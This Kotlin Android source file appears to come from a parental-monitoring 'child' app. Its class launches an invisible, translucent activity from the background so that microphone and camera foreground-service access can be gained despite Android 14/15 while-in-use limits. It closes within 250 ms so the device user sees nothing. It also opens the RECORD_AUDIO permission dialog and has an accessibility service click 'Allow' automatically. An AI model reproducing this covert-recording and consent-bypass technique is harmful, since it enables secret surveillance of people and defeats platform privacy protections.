package com.familyguard.child.ui

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.SystemClock
import androidx.activity.ComponentActivity
import androidx.core.content.ContextCompat
import com.familyguard.child.data.Store
import com.familyguard.child.service.MainService

/**
 * Invisible "while-in-use" FGS type upgrader — Android 14/15 mic/camera fix.
 *
 * PROBLEM: Android 14/15 par mic/camera FGS type ka activation sirf tab legal
 * hai jab app ke paas VISIBLE activity ho ("while-in-use"). Parent dashboard se
 * audio_start/camera command aata hai — child app tab BACKGROUND me hota hai,
 * isliye mic type upgrade chupchap reject hota tha aur AudioRecord chupchap
 * SILENCE deta tha ("mic bhi ni kaam karra" — sirf Android 14/15 par).
 *
 * FIX: ek TRANSLUCENT, content-less, excludeFromRecents activity jo:
 *   1. background se khulti hai (overlay permission + ConsentActivity jaisa hi)
 *   2. khulte hi MainService ke FGS types me mic/camera upgrade karti hai
 *      (ab app genuinely foreground hai, isliye system while-in-use grant deta hai)
 *   3. ~250 ms me khud finish — bachche ko KUCH nahi dikhta
 * FGS ke paas upgrade ke waqt while-in-use grant mil chuka hota hai, isliye
 * activity finish hone ke baad bhi mic/camera access chalta rehta hai.
 *
 * MODE "micperm": RECORD_AUDIO runtime permission bhi missing ho to yahin
 * requestPermissions() se system permission dialog khulta hai aur
 * EnforcementService (accessibility) uska "Allow" button KHUD click kar deta
 * hai — mic permission bina kisi tap ke heal ho jati hai.
 *
 * Screen locked ho to bhi bina screen jagaaye kaam kare (quiet consent jaisa) —
 * setShowWhenLocked(true), par setTurnScreenOn NAHI.
 */
class ForegroundPokeActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        runCatching {
            if (Build.VERSION.SDK_INT >= 27) setShowWhenLocked(true)
        }
        val mode = intent?.getStringExtra("mode") ?: "mic"

        if (mode == "micperm") {
            requestMicPermissionOrUpgrade()
        } else {
            // Upgrade karo — ab hum resumed activity hain, isliye system while-in-use
            // grant de deta hai. Bina overlay/background-launch support ke bhi TRY kar
            // hi lo: agar activity khud hi khul gayi hai to hum foreground hain.
            when (mode) {
                "cam" -> {
                    MainService.updateTypes(withMic = false, withCam = true)
                    Store.pokeCamDoneAt = SystemClock.elapsedRealtime()
                }
                else -> {
                    MainService.updateTypes(withMic = true, withCam = false)
                    Store.pokeMicDoneAt = SystemClock.elapsedRealtime()
                }
            }
            // Thoda sa time do: startForeground ko types register karne me ek frame
            // lagta hai. Phir turant finish — koi UI kabhi dikhta hi nahi.
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                runCatching { finish() }
            }, 250L)
        }
        // "micperm" apna finish onRequestPermissionsResult me khud karta hai —
        // dialog screen par tab tak rehta hai (a11y click ke liye).
    }

    private fun requestMicPermissionOrUpgrade() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            == PackageManager.PERMISSION_GRANTED
        ) {
            // Permission already hai — seedha upgrade + done bhej do
            MainService.updateTypes(withMic = true, withCam = false)
            Store.pokeMicDoneAt = SystemClock.elapsedRealtime()
            Store.pokeMicPermAt = SystemClock.elapsedRealtime()
            finish()
            return
        }
        // System permission dialog khulega (permissioncontroller) —
        // EnforcementService "mic" step armed hai, "Allow" khud click hoga.
        requestPermissions(arrayOf(Manifest.permission.RECORD_AUDIO), 7001)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != 7001) return
        val granted = grantResults.isNotEmpty() &&
            grantResults[0] == PackageManager.PERMISSION_GRANTED
        if (granted) {
            // Ab app foreground (dialog ke pichhe resumed) hai — while-in-use
            // upgrade yahin legal hai. audio_start dono stamps poll karta hai.
            MainService.updateTypes(withMic = true, withCam = false)
            Store.pokeMicDoneAt = SystemClock.elapsedRealtime()
            Store.pokeMicPermAt = SystemClock.elapsedRealtime()
        }
        runCatching { finish() }
    }
}
